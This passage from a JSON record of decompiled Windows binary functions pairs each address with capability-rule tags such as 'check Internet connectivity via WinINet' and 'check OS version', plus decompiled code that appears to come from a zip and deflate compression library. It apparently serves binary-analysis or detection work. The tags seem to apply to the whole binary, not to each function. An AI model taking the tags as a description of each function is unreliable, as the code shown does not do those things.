>> 8;\n                    in_EAX[0x11] = in_EAX[0x11] + -8;\n                }\n            }\n        }\n        else {\n            iVar3 = fcn.004156d4();\n            if ((in_EAX[0xf] != NULL) && (in_EAX[0xf] <= in_EAX[0xc] + (1 - pcVar2))) goto code_r0x00415c55;\ncode_r0x00415d5b:\n            if (iVar3 == 0) {\n                in_EAX[0xc] = pcVar2;\n                in_EAX[0x12] = pcVar4;\n                in_EAX[0x11] = pcVar6;\n                fcn.004156d4();\n            }\n        }\n        if (param_2 != 0) {\n            if (param_2 == 4) {\n                if (in_EAX[0x11] != NULL) {\n                    in_EAX[0x11] = 0x8;\n                    while (0x7 < in_EAX[0x11]) {\n                        pcVar6 = in_EAX[0xc];\n                        if (pcVar6 < in_EAX[0xd]) {\n                            in_EAX[0xc] = pcVar6 + 1;\n                            *pcVar6 = SUB41(in_EAX[0x12], 0);\n                        }\n                        in_EAX[0x12] = in_EAX[0x12] >> 8;\n                        in_EAX[0x11] = in_EAX[0x11] + -8;\n                    }\n                }\n                if ((*(in_EAX + 9) & 0x10) != 0) {\n                    pcVar6 = in_EAX[6];\n                    iVar3 = 4;\n                    do {\n                        in_EAX[0x12] = in_EAX[0x12] | (pcVar6 >> 0x18) << (in_EAX[0x11] & 0x1f);\n                        in_EAX[0x11] = in_EAX[0x11] + 8;\n                        while (0x7 < in_EAX[0x11]) {\n                            pcVar2 = in_EAX[0xc];\n                            if (pcVar2 < in_EAX[0xd]) {\n                                in_EAX[0xc] = pcVar2 + 1;\n                                *pcVar2 = SUB41(in_EAX[0x12], 0);\n                            }\n                            in_EAX[0x12] = in_EAX[0x12] >> 8;\n                            in_EAX[0x11] = in_EAX[0x11] + -8;\n                        }\n                        pcVar6 = pcVar6 << 8;\n                        iVar3 = iVar3 + -1;\n                    } while (iVar3 != 0);\n                }\n            }\n            else {\n                in_EAX[0x11] = in_EAX[0x11] + 3;\n                while (0x7 < in_EAX[0x11]) {\n                    pcVar6 = in_EAX[0xc];\n                    if (pcVar6 < in_EAX[0xd]) {\n                        in_EAX[0xc] = pcVar6 + 1;\n                        *pcVar6 = SUB41(in_EAX[0x12], 0);\n                    }\n                    in_EAX[0x12] = in_EAX[0x12] >> 8;\n                    in_EAX[0x11] = in_EAX[0x11] + -8;\n                }\n                if (in_EAX[0x11] != NULL) {\n                    in_EAX[0x11] = 0x8;\n                    while (0x7 < in_EAX[0x11]) {\n                        pcVar6 = in_EAX[0xc];\n                        if (pcVar6 < in_EAX[0xd]) {\n                            in_EAX[0xc] = pcVar6 + 1;\n                            *pcVar6 = SUB41(in_EAX[0x12], 0);\n                        }\n                        in_EAX[0x12] = in_EAX[0x12] >> 8;\n                        in_EAX[0x11] = in_EAX[0x11] + -8;\n                    }\n                }\n                iVar3 = 2;\n                uVar5 = 0;\n                do {\n                    in_EAX[0x12] = in_EAX[0x12] | uVar5 << (in_EAX[0x11] & 0x1f);\n                    in_EAX[0x11] = in_EAX[0x11] + 0x10;\n                    while (0x7 < in_EAX[0x11]) {\n                        pcVar6 = in_EAX[0xc];\n                        if (pcVar6 < in_EAX[0xd]) {\n                            in_EAX[0xc] = pcVar6 + 1;\n                            *pcVar6 = SUB41(in_EAX[0x12], 0);\n                        }\n                        in_EAX[0x12] = in_EAX[0x12] >> 8;\n                        in_EAX[0x11] = in_EAX[0x11] + -8;\n                    }\n                    uVar5 = uVar5 ^ 0xffff;\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n            }\n        }\n        unaff_EBP = in_EAX[0xc];\n        if (unaff_EBP < in_EAX[0xd]) goto code_r0x00415ed7;\n        uVar11 = 0xc8b;\n        pcVar10 = \"d->m_pOutput_buf < d->m_pOutput_buf_end\";\n    }\n    else {\n        uVar11 = 0xc3e;\n        pcVar10 = \"!d->m_output_flush_remaining\";\n    }\n    sub.msvcrt.dll__assert(pcVar10, 0x424620, uVar11);\ncode_r0x00415ed7:\n    puVar8 = in_EAX + 0x8192;\n    for (iVar3 = 0x90; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    puVar8 = in_EAX + 0x83d2;\n    for (iVar3 = 0x10; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    in_EAX[0xe] = 0x8;\n    in_EAX[10] = in_EAX + 0x9273;\n    in_EAX[0x19] = in_EAX[0x19] + 1;\n    in_EAX[0xb] = in_EAX + 0x9272;\n    in_EAX[0x10] = in_EAX[0x10] + in_EAX[0xf];\n    pcVar6 = unaff_EBP + -pcVar7;\n    in_EAX[0xf] = NULL;\n    if (pcVar6 != NULL) {\n        pcVar2 = *in_EAX;\n        if (pcVar2 == NULL) {\n            if (pcVar7 == in_EAX + 0x39272) {\n                pcVar2 = *in_EAX[0x1f] - in_EAX[0x23];\n                if (pcVar6 < pcVar2) {\n                    pcVar2 = pcVar6;\n                }\n                pcVar9 = in_EAX[0x23] + in_EAX[0x1d];\n                for (pcVar4 = pcVar2; pcVar4 != NULL; pcVar4 = pcVar4 + -1) {\n                    *pcVar9 = *pcVar7;\n                    pcVar7 = pcVar7 + 1;\n                    pcVar9 = pcVar9 + 1;\n                }\n                in_EAX[0x23] = in_EAX[0x23] + pcVar2;\n                if (pcVar6 + -pcVar2 != NULL) {\n                    in_EAX[0x16] = pcVar2;\n                    in_EAX[0x17] = pcVar6 + -pcVar2;\n                }\n            }\n            else {\n                in_EAX[0x23] = in_EAX[0x23] + pcVar6;\n            }\n        }\n        else {\n            *in_EAX[0x1e] = in_EAX[0x21] - in_EAX[0x1c];\n            iVar3 = (*pcVar2)(in_EAX + 0x39272, pcVar6, in_EAX[1]);\n            if (iVar3 == 0) {\n                in_EAX[0x1b] = 0xffffffff;\n                return 0xffffffff;\n            }\n        }\n    }\n    return in_EAX[0x17];\n}\n",
        "token_count": 3892
    },
    "0041606c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.0041606c(void)\n\n{\n    uint *in_EAX;\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (((in_EAX != NULL) && (in_EAX[0x12] == 0)) && (in_EAX[5] == 0)) {\n        if (in_EAX[10] == 0) {\n            in_EAX[10] = 0x414964;\n        }\n        if (in_EAX[0xb] == 0) {\n            in_EAX[0xb] = 0x414957;\n        }\n        if (in_EAX[0xc] == 0) {\n            in_EAX[0xc] = 0x41505f;\n        }\n        in_EAX[5] = 1;\n        *in_EAX = 0;\n        in_EAX[1] = 0;\n        in_EAX[2] = 0;\n        in_EAX[3] = 0;\n        in_EAX[4] = 0;\n        puVar1 = (*in_EAX[10])(in_EAX[0xd], 1, 0x58);\n        in_EAX[0x12] = puVar1;\n        uVar2 = 0;\n        if (puVar1 != NULL) {\n            for (iVar3 = 0x16; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar1 = 0;\n                puVar1 = puVar1 + 1;\n            }\n            iVar3 = in_EAX[0x12];\n            *(iVar3 + 0xc) = 1;\n            *(iVar3 + 0x1c) = 4;\n            *(iVar3 + 0x2c) = 4;\n            uVar2 = 1;\n        }\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 423
    },
    "00416134": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00416134(uint32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    uint32_t extraout_ECX;\n    int32_t *piVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    ulong uVar6;\n    \n    uVar6 = CONCAT44(param_2, in_EAX);\n    iVar1 = *(param_2 + 0xc);\n    if (iVar1 == 0) {\n        uVar6 = sub.msvcrt.dll__assert(\"pArray->m_element_size\", 0x424620, 0x1102);\n        param_1 = extraout_ECX;\n    }\n    piVar2 = uVar6 >> 0x20;\n    uVar4 = piVar2[2];\n    uVar3 = 1;\n    if (uVar4 < param_1) {\n        uVar5 = param_1;\n        if (param_3 != 0) {\n            if (uVar4 == 0) {\n                uVar4 = 1;\n            }\n            for (; uVar5 = uVar4,  uVar4 < param_1; uVar4 = uVar4 * 2) {\n            }\n        }\n        iVar1 = (**(uVar6 + 0x30))(*(uVar6 + 0x34), *piVar2, iVar1, uVar5);\n        uVar3 = 0;\n        if (iVar1 != 0) {\n            *piVar2 = iVar1;\n            piVar2[2] = uVar5;\n            uVar3 = 1;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 391
    },
    "00416311": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00416311(uint32_t param_1, uchar *param_2, uchar *param_3, uint32_t param_4)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uchar *puVar6;\n    uint32_t *puVar7;\n    uchar *puVar8;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    int32_t in_stack_00000030;\n    uchar uStack128;\n    int16_t iStack124;\n    uchar uStack120;\n    uchar uStack116;\n    uchar uStack112;\n    uint32_t uStack80;\n    uchar auStack74 [4];\n    uchar uStack70;\n    uint8_t uStack68;\n    uchar uStack64;\n    uchar uStack63;\n    uchar uStack62;\n    uchar uStack61;\n    uchar uStack60;\n    uchar uStack59;\n    uchar uStack46;\n    uchar uStack45;\n    uchar uStack44;\n    uchar uStack43;\n    uchar uStack42;\n    uchar uStack41;\n    \n    piVar2 = *(in_EAX + 0x48);\n    uVar3 = piVar2[1];\n    if (in_stack_00000030 != 0) {\n        return 0;\n    }\n    if ((0xffffffd1 < uVar3) + CARRY4(param_4 & 0xffff, uVar3 + 0x2e) +\n        CARRY4(param_1 & 0xffff, (param_4 & 0xffff) + uVar3 + 0x2e) != '\\0') {\n        return 0;\n    }\n    iStack124 = in_stack_00000020;\n    puVar6 = auStack74;\n    for (iVar4 = 0x2e; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    auStack74[0] = 0x50;\n    auStack74[1] = 0x4b;\n    auStack74[2] = 1;\n    auStack74[3] = 2;\n    uStack70 = 0x5b;\n    uStack68 = ~-(iStack124 == 0) & 0x14;\n    iStack124._0_1_ = in_stack_00000020;\n    uStack64 = iStack124;\n    uStack63 = in_stack_00000020 >> 8;\n    uStack116 = in_stack_00000024;\n    uStack62 = uStack116;\n    uStack61 = in_stack_00000024 >> 8;\n    uStack112 = in_stack_00000028;\n    uStack60 = uStack112;\n    uStack59 = in_stack_00000028 >> 8;\n    uStack80 = uVar3;\n    fcn.00414900();\n    fcn.00414900();\n    fcn.00414900();\n    uStack120 = param_1;\n    uStack44 = 0;\n    uStack43 = 0;\n    uStack46 = uStack120;\n    uStack45 = param_1 >> 8;\n    uStack128 = param_4;\n    uStack42 = uStack128;\n    uStack41 = param_4 >> 8;\n    fcn.00414900();\n    fcn.00414900();\n    iVar4 = piVar2[1];\n    uVar1 = iVar4 + 0x2e;\n    if ((piVar2[2] <= uVar1 && uVar1 != piVar2[2]) && (iVar5 = fcn.00416134(1),  iVar5 == 0)) goto code_r0x00416556;\n    piVar2[1] = uVar1;\n    puVar6 = auStack74;\n    puVar8 = *piVar2 + iVar4 * piVar2[3];\n    for (iVar5 = piVar2[3] * 0x2e; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    param_1 = param_1 & 0xffff;\n    if (param_1 != 0) {\n        if (param_2 == NULL) goto code_r0x00416556;\n        iVar4 = piVar2[1];\n        uVar1 = param_1 + iVar4;\n        if ((piVar2[2] <= uVar1 && uVar1 != piVar2[2]) && (iVar5 = fcn.00416134(1),  iVar5 == 0)) goto code_r0x00416556;\n        piVar2[1] = uVar1;\n        puVar6 = *piVar2 + iVar4 * piVar2[3];\n        for (iVar5 = piVar2[3] * param_1; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *puVar6 = *param_2;\n            param_2 = param_2 + 1;\n            puVar6 = puVar6 + 1;\n        }\n    }\n    param_4 = param_4 & 0xffff;\n    if (param_4 != 0) {\n        if (param_3 == NULL) goto code_r0x00416556;\n        iVar4 = piVar2[1];\n        uVar1 = param_4 + iVar4;\n        if ((piVar2[2] <= uVar1 && uVar1 != piVar2[2]) && (iVar5 = fcn.00416134(1),  iVar5 == 0)) goto code_r0x00416556;\n        piVar2[1] = uVar1;\n        puVar6 = *piVar2 + iVar4 * piVar2[3];\n        for (iVar5 = piVar2[3] * param_4; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *puVar6 = *param_3;\n            param_3 = param_3 + 1;\n            puVar6 = puVar6 + 1;\n        }\n    }\n    iVar4 = piVar2[5];\n    uVar1 = iVar4 + 1;\n    if ((uVar1 < piVar2[6] || uVar1 == piVar2[6]) || (iVar5 = fcn.00416134(1),  iVar5 != 0)) {\n        iVar5 = piVar2[7];\n        piVar2[5] = uVar1;\n        puVar7 = &uStack80;\n        puVar6 = piVar2[4] + iVar4 * iVar5;\n        for (; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *puVar6 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar6 = puVar6 + 1;\n        }\n        return 1;\n    }\ncode_r0x00416556:\n    if ((uVar3 < piVar2[2] || uVar3 == piVar2[2]) || (iVar4 = fcn.00416134(0),  iVar4 != 0)) {\n        piVar2[1] = uVar3;\n    }\n    return 0;\n}\n",
        "token_count": 1692
    },
    "00416619": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint fcn.00416619(void)\n\n{\n    uint32_t *puVar1;\n    uchar *puVar2;\n    uint32_t uVar3;\n    uint16_t uVar4;\n    code *pcVar5;\n    int32_t **ppiVar6;\n    int32_t *piVar7;\n    uint *puVar8;\n    uint uVar9;\n    uint32_t *in_EAX;\n    uint32_t uVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    ushort *puVar13;\n    uint8_t *puVar14;\n    uint32_t uVar15;\n    int32_t iVar16;\n    int32_t iVar17;\n    uint8_t uVar18;\n    uint32_t *puVar19;\n    uint32_t *puVar21;\n    uint32_t *puVar22;\n    uint32_t *puVar23;\n    uint32_t *puVar24;\n    uint32_t *puVar25;\n    uint32_t uVar26;\n    uint8_t uVar27;\n    uint32_t uVar28;\n    ushort *puVar29;\n    int32_t *piVar30;\n    bool bVar31;\n    ulong uVar32;\n    uint32_t *puStack20;\n    uint32_t *puVar20;\n    \n    puStack20 = in_EAX;\n    uVar32 = fcn.0041f3f0();\n    iVar11 = -uVar32;\n    puVar19 = &stack0xffffffec + iVar11;\n    *(&stack0x0000001c + iVar11) = uVar32 >> 0x20;\n    uVar28 = puStack20[1];\n    uVar10 = *puStack20;\n    if ((uVar28 == 0) && (uVar10 < 0x16)) {\ncode_r0x00416642:\n        puStack20[7] = 8;\n        return 0;\n    }\n    if ((uVar28 < 0) || ((uVar28 < 1 && (uVar10 < 0x1001)))) {\n        *(&stack0x0000000c + iVar11) = 0;\n        *(&stack0x00000010 + iVar11) = 0;\n    }\n    else {\n        *(&stack0x0000000c + iVar11) = uVar10 - 0x1000;\n        *(&stack0x00000010 + iVar11) = (uVar28 - 1) + (0xfff < uVar10);\n    }\n    puVar2 = &stack0x0000009c + iVar11;\n    while( true ) {\n        uVar28 = *puStack20;\n        if ((puStack20[1] - puVar19[9] == uVar28 < puVar19[8]) && (uVar28 - puVar19[8] < 0x1001)) {\n            uVar28 = uVar28 - puVar19[8];\n        }\n        else {\n            uVar28 = 0x1000;\n        }\n        puVar19[4] = uVar28;\n        puVar19[3] = puVar2;\n        puVar19[1] = puVar19[8];\n        puVar19[2] = puVar19[9];\n        *puVar19 = puStack20[0x11];\n        pcVar5 = puStack20[0xe];\n        puVar20 = puVar19 + -1;\n        puVar19 = puVar19 + -1;\n        *puVar20 = 0x4166d6;\n        uVar10 = (*pcVar5)();\n        if (uVar28 != uVar10) break;\n        uVar28 = uVar28 - 4;\n        uVar10 = uVar28 + puVar19[8];\n        uVar15 = (uVar28 >> 0x1f) + puVar19[9] + CARRY4(uVar28, puVar19[8]);\n        for (; -1 < uVar28; uVar28 = uVar28 - 1) {\n            if ((*(puVar2 + uVar28) == 0x6054b50) &&\n               ((puStack20[1] - uVar15 != *puStack20 < uVar10 || (0x15 < *puStack20 - uVar10)))) {\n                puVar19[4] = 0x16;\n                puVar19[3] = puVar2;\n                puVar19[1] = uVar10;\n                puVar19[2] = uVar15;\n                *puVar19 = puStack20[0x11];\n                pcVar5 = puStack20[0xe];\n                puVar21 = puVar19 + -1;\n                puVar19[-1] = 0x416736;\n                iVar11 = (*pcVar5)();\n                if (iVar11 != 0x16) goto code_r0x00416baa;\n                if (puVar21[0x2c] != 0x6054b50) goto code_r0x00416642;\n                if ((0 < uVar15) || ((-1 < uVar15 && (0x4b < uVar10)))) {\n                    puVar21[4] = 0x14;\n                    puVar21[3] = puVar21 + 0x19;\n                    puVar21[1] = uVar10 - 0x14;\n                    puVar21[2] = (uVar15 - 1) + (0x13 < uVar10);\n                    *puVar21 = puStack20[0x11];\n                    pcVar5 = puStack20[0xe];\n                    puVar22 = puVar21 + -1;\n                    puVar21 = puVar21 + -1;\n                    *puVar22 = 0x4167bf;\n                    iVar11 = (*pcVar5)();\n                    if ((iVar11 == 0x14) && (puVar21[0x19] == 0x7064b50)) {\n                        uVar28 = puVar21[0x1c];\n                        uVar10 = (puStack20[1] - 1) + (0x37 < *puStack20);\n                        if ((uVar10 < uVar28) || ((uVar10 <= uVar28 && (*puStack20 - 0x38 < puVar21[0x1b]))))\n                        goto code_r0x00416642;\n                        puVar21[4] = 0x38;\n                        puVar21[1] = puVar21[0x1b];\n                        puVar21[2] = uVar28;\n                        puVar21[3] = puVar21 + 0x1e;\n                        *puVar21 = puStack20[0x11];\n                        pcVar5 = puStack20[0xe];\n                        puVar23 = puVar21 + -1;\n                        puVar21 = puVar21 + -1;\n                        *puVar23 = 0x416814;\n                        iVar11 = (*pcVar5)();\n                        if ((iVar11 == 0x38) && (*(puVar21 + 0x78) == 0x6064b50)) {\n                            *(puStack20[0x12] + 0x34) = 1;\n                        }\n                    }\n                }\n                uVar28 = puStack20[0x12];\n                iVar11 = *(uVar28 + 0x34);\n                puStack20[4] = *(puVar21 + 0xba);\n                if (iVar11 == 0) {\n                    uVar26 = 0;\n                    uVar10 = *(puVar21 + 0x2e);\n                    puVar21[8] = puVar21[0x2f];\n                    uVar15 = puVar21[0x30];\n                    puVar21[0xf] = *(puVar21 + 0x2d);\n                    uVar12 = *(puVar21 + 0xb6);\n                }\n                else {\n                    if ((puVar21[0x20] == 0) && (puVar21[0x1f] < 0x2c)) goto code_r0x00416bc9;\n                    if (puVar21[0x1d] != 1) goto code_r0x00416892;\n                    if (puVar21[0x27] != 0) {\ncode_r0x004168af:\n                        puStack20[7] = 2;\n                        return 0;\n                    }\n                    uVar12 = puVar21[0x25];\n                    uVar10 = puVar21[0x24];\n                    uVar15 = puVar21[0x28];\n                    uVar26 = puVar21[0x29];\n                    puStack20[4] = puVar21[0x26];\n                    if (uVar12 != 0) goto code_r0x004168af;\n                    if (uVar26 != 0) {\n                        puStack20[7] = 0xf;\n                        return 0;\n                    }\n                    puVar21[8] = uVar15;\n                    uVar15 = puVar21[0x2a];\n                    uVar26 = puVar21[0x2b];\n                    puVar21[0xf] = puVar21[0x22];\n                    uVar12 = puVar21[0x23];\n                }\n                uVar3 = puStack20[4];\n                puVar21[10] = uVar15;\n                puVar21[0xb] = uVar26;\n                if ((uVar10 != uVar3) || (((puVar21[0xf] | uVar12) != 0 && ((puVar21[0xf] != 1 || (uVar12 != 1))))))\n                goto code_r0x00416892;\n                if (puVar21[8] < uVar10 * 0x2e) goto code_r0x00416bc9;\n                uVar15 = puVar21[8] + puVar21[10];\n                uVar26 = puVar21[0xb] + CARRY4(puVar21[8], puVar21[10]);\n                bVar31 = puStack20[1] <= uVar26;\n                if ((bVar31 && uVar26 != puStack20[1]) || ((bVar31 && (*puStack20 <= uVar15 && uVar15 != *puStack20))))\n                goto code_r0x00416bc9;\n                uVar15 = puVar21[0xc];\n                puStack20[3] = puVar21[0xb];\n                puVar21[0x13] = uVar15 & 0x800;\n                puStack20[2] = puVar21[10];\n                if (uVar10 == 0) goto code_r0x0041698a;\n                if (*(uVar28 + 8) <= puVar21[8] && puVar21[8] != *(uVar28 + 8)) {\n                    *puVar21 = 0;\n                    puVar21[-1] = 0x4169ce;\n                    iVar11 = fcn.00416134();\n                    if (iVar11 == 0) goto code_r0x00416a14;\n                }\n                uVar10 = puStack20[0x12];\n                *(uVar28 + 4) = puVar21[8];\n                uVar28 = puStack20[4];\n                if (*(uVar10 + 0x18) < uVar28) {\n                    *puVar21 = 0;\n                    puVar21[-1] = 0x4169e4;\n                    iVar11 = fcn.00416134();\n                    if (iVar11 == 0) goto code_r0x00416a14;\n                }\n                uVar15 = puVar21[0x13];\n                *(uVar10 + 0x14) = uVar28;\n                if (uVar15 == 0) {\n                    uVar28 = puStack20[0x12];\n                    uVar10 = puStack20[4];\n                    puVar1 = uVar28 + 0x28;\n                    if (*puVar1 <= uVar10 && uVar10 != *puVar1) {\n                        *puVar21 = 0;\n                        puVar21[-1] = 0x416a10;\n                        iVar11 = fcn.00416134();\n                        if (iVar11 == 0) goto code_r0x00416a14;\n                    }\n                    *(uVar28 + 0x24) = uVar10;\n                }\n                puVar21[4] = puVar21[8];\n                uVar28 = *puStack20[0x12];\n                puVar21[2] = puVar21[0xb];\n                puVar21[3] = uVar28;\n                puVar21[1] = puVar21[10];\n                *puVar21 = puStack20[0x11];\n                pcVar5 = puStack20[0xe];\n                puVar24 = puVar21 + -1;\n                puVar21 = puVar21 + -1;\n                *puVar24 = 0x416a4d;\n                iVar11 = (*pcVar5)();\n                if (*(puVar21 + 0x20) != iVar11) goto code_r0x00416baa;\n                ppiVar6 = puStack20[0x12];\n                *(puVar21 + 0x48) = 0;\n                piVar30 = *ppiVar6;\n                *(puVar21 + 0x50) = *(puVar21 + 0x28) + 0x2e;\n                *(puVar21 + 0x54) = *(puVar21 + 0x2c) + (0xffffffd1 < *(puVar21 + 0x28));\n                goto code_r0x00416aa2;\n            }\n            bVar31 = uVar10 != 0;\n            uVar10 = uVar10 - 1;\n            uVar15 = (uVar15 - 1) + bVar31;\n        }\n        if ((((puVar19[9] | puVar19[8]) == 0) || (puStack20[1] - puVar19[9] != *puStack20 < puVar19[8])) ||\n           (0x10014 < *puStack20 - puVar19[8])) break;\n        if ((puVar19[9] < 0) || ((puVar19[9] < 1 && (puVar19[8] < 0xffe)))) {\n            puVar19[8] = 0;\n            puVar19[9] = 0;\n        }\n        else {\n            puVar1 = puVar19 + 8;\n            uVar28 = *puVar1;\n            *puVar1 = *puVar1 - 0xffd;\n            puVar19[9] = (puVar19[9] - 1) + (0xffc < uVar28);\n        }\n    }\n    puStack20[7] = 7;\n    return 0;\ncode_r0x00416aa2:\n    if (puStack20[4] <= puVar21[0x12]) goto code_r0x0041698a;\n    if ((puVar21[8] < 0x2e) || (*piVar30 != 0x2014b50)) {\ncode_r0x00416bc9:\n        puStack20[7] = 9;\n        return 0;\n    }\n    piVar7 = puStack20[0x12];\n    uVar28 = puVar21[0x12];\n    uVar10 = puVar21[0x13];\n    *(piVar7[4] + uVar28 * 4) = piVar30 - *piVar7;\n    if (uVar10 == 0) {\n        *(piVar7[8] + uVar28 * 4) = uVar28;\n    }\n    uVar28 = piVar30[5];\n    puVar21[0xb] = 0;\n    puVar21[0xd] = 0;\n    iVar11 = piVar7[0xe];\n    puVar21[10] = uVar28;\n    uVar28 = piVar30[6];\n    puVar21[0x11] = 0;\n    uVar10 = *(piVar30 + 0x1e);\n    puVar21[0xc] = uVar28;\n    puVar21[0x10] = *(piVar30 + 0x2a);\n    uVar28 = *(piVar30 + 7);\n    if ((iVar11 == 0) && (uVar10 != 0)) {\n        uVar26 = puVar21[0xb];\n        bVar31 = uVar26 < puVar21[0xd];\n        uVar15 = puVar21[10];\n        if ((bVar31 || uVar26 == puVar21[0xd]) && ((bVar31 || (uVar15 < puVar21[0xc])))) {\n            uVar15 = puVar21[0xc];\n            uVar26 = puVar21[0xd];\n        }\n        bVar31 = uVar26 < puVar21[0x11];\n        if ((bVar31 || uVar26 == puVar21[0x11]) && ((bVar31 || (uVar15 < puVar21[0x10])))) {\n            uVar15 = puVar21[0x10];\n            uVar26 = puVar21[0x11];\n        }\n        if ((~uVar15 | uVar26) == 0) {\n            if (puVar21[8] < uVar10 + 0x2e + uVar28) {\n                *puVar21 = uVar10;\n                puVar21[0x10] = uVar10;\n                puVar21[-1] = 0x416b63;\n                puVar13 = sub.msvcrt.dll_malloc();\n                if (puVar13 == NULL) {\ncode_r0x00416a14:\n                    puStack20[7] = 0x10;\n                    return 0;\n                }\n                puVar21[3] = puVar13;\n                puVar21[4] = puVar21[0x10];\n                puVar21[1] = uVar28 + puVar21[0x14];\n                puVar21[2] = puVar21[0x15] + CARRY4(uVar28, puVar21[0x14]);\n                *puVar21 = puStack20[0x11];\n                pcVar5 = puStack20[0xe];\n                puVar25 = puVar21 + -1;\n                puVar21 = puVar21 + -1;\n                *puVar25 = 0x416b96;\n                uVar28 = (*pcVar5)();\n                uVar10 = puVar21[0x10];\n                puVar29 = puVar13;\n                if (uVar10 != uVar28) {\n                    *puVar21 = puVar13;\n                    puVar21[-1] = 0x416baa;\n                    sub.msvcrt.dll_free();\ncode_r0x00416baa:\n                    puStack20[7] = 0x14;\n                    return 0;\n                }\n            }\n            else {\n                puVar13 = piVar30 + uVar28 + 0x2e;\n                puVar29 = NULL;\n            }\n            do {\n                if (uVar10 < 4) {\ncode_r0x00416bc1:\n                    *puVar21 = puVar29;\n                    puVar21[-1] = 0x416bc9;\n                    sub.msvcrt.dll_free();\n                    goto code_r0x00416bc9;\n                }\n                *(puVar21 + 0x16) = *puVar13;\n                uVar4 = puVar13[1];\n                uVar28 = uVar4 + 4;\n                puVar21[0x10] = uVar28;\n                if (uVar10 < uVar28) goto code_r0x00416bc1;\n                if (*(puVar21 + 0x16) == 1) {\n                    uVar28 = puStack20[0x12];\n                    *(uVar28 + 0x34) = 1;\n                    *(uVar28 + 0x38) = 1;\n                    break;\n                }\n                puVar13 = puVar13 + puVar21[0x10];\n                uVar10 = uVar10 + (-4 - uVar4);\n            } while (uVar10 != 0);\n            *puVar21 = puVar29;\n            puVar21[-1] = 0x416c11;\n            sub.msvcrt.dll_free();\n        }\n    }\n    if ((((*(puVar21 + 0x2c) | ~*(puVar21 + 0x28)) != 0) && ((~*(puVar21 + 0x30) | *(puVar21 + 0x34)) != 0)) &&\n       (((*(piVar30 + 10) == 0 && ((*(puVar21 + 0x28) ^ *(puVar21 + 0x30) | *(puVar21 + 0x2c) ^ *(puVar21 + 0x34)) != 0)\n         ) || (((*(puVar21 + 0x30) | *(puVar21 + 0x34)) != 0 && ((*(puVar21 + 0x28) | *(puVar21 + 0x2c)) == 0))))))\n    goto code_r0x00416bc9;\n    uVar28 = *(piVar30 + 0x22);\n    if ((uVar28 == 0xffff) || ((*(puVar21 + 0x3c) != uVar28 && (uVar28 != 1)))) {\ncode_r0x00416892:\n        puStack20[7] = 10;\n        return 0;\n    }\n    if ((~*(puVar21 + 0x28) | *(puVar21 + 0x2c)) != 0) {\n        uVar28 = *(piVar30 + 0x2a) + *(puVar21 + 0x28);\n        uVar10 = uVar28 + 0x1e;\n        uVar28 = *(puVar21 + 0x2c) + CARRY4(*(piVar30 + 0x2a), *(puVar21 + 0x28)) + (0xffffffe1 < uVar28);\n        bVar31 = puStack20[1] <= uVar28;\n        if ((bVar31 && uVar28 != puStack20[1]) || ((bVar31 && (*puStack20 <= uVar10 && uVar10 != *puStack20))))\n        goto code_r0x00416bc9;\n    }\n    if ((*(piVar30 + 9) & 0x20) != 0) {\n        puStack20[7] = 5;\n        return 0;\n    }\n    uVar28 = *(piVar30 + 8) + *(piVar30 + 7) + 0x2e + *(piVar30 + 0x1e);\n    if (*(puVar21 + 0x20) < uVar28) goto code_r0x00416bc9;\n    *(puVar21 + 0x20) = *(puVar21 + 0x20) - uVar28;\n    *(puVar21 + 0x48) = *(puVar21 + 0x48) + 1;\n    piVar30 = piVar30 + uVar28;\n    goto code_r0x00416aa2;\ncode_r0x0041698a:\n    if (*(puVar21 + 0x4c) == 0) {\n        uVar28 = puStack20[4];\n        uVar10 = puStack20[0x12];\n        *(puVar21 + 0x20) = uVar10;\n        puVar8 = *(uVar10 + 0x20);\n        *(puVar21 + 0x3c) = 